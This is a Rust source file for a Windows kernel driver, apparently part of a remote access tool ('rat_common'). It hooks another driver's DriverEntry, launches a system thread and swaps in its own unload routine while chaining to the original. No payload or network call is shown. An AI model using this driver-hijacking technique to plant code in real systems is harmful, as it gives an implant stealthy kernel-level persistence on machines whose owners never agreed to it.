use alloc::boxed::Box;
use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr};

use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::ntddk::PsCreateSystemThread;
use wdk_sys::{HANDLE, NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS};
use widestring::Utf16Str;

use crate::state::{DRIVER_STATE, DriverState};
use crate::{error, info, initialize};

type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
static _ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
    info!("DriverUnload: driver={driver:p}");
    let old_driver_unload_ptr = _ORIGINAL_DRIVER_UNLOAD.load(Ordering::Acquire);
    if !old_driver_unload_ptr.is_null() {
        unsafe {
            let old_driver_unload =
                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
            old_driver_unload(driver);
        }
    }

    let state = DRIVER_STATE.swap(ptr::null_mut(), Ordering::AcqRel);
    if !state.is_null() {
        unsafe {
            let _ = Box::from_raw(state);
        }
    }
}

pub fn driver_entry_prehook(
    driver: PDRIVER_OBJECT,
    registry_path: Option<&Utf16Str>,
    _: &KernelHandoff,
) -> anyhow::Result<(), NTSTATUS> {
    info!("DriverEntry: driver={driver:p}, registry_path={registry_path:?}");
    Ok(())
}

pub fn driver_entry_posthook(
    driver: PDRIVER_OBJECT,
    _: Option<&Utf16Str>,
    status: NTSTATUS,
    extra: &KernelHandoff,
) -> anyhow::Result<(), NTSTATUS> {
    info!("Original DriverEntry returned with status: 0x{status:X}");

    let mut thread = HANDLE::default();

    let state = DriverState::new(driver, extra)?;
    DRIVER_STATE.store(Box::into_raw(Box::new(state)), Ordering::Release);

    let status = unsafe {
        PsCreateSystemThread(
            &mut thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            Some(initialize::initialize_thread_routine),
            ptr::null_mut(),
        )
    };
    if !nt_success(status) {
        error!("PsCreateSystemThread error (initialize_thread_routine): 0x{status:X}");
        return Err(status);
    }

    if let Some(driver) = unsafe { driver.as_mut() } {
        if let Some(unload) = driver.DriverUnload {
            _ORIGINAL_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
        }

        driver.DriverUnload = Some(driver_unload);
    }

    Ok(())
}
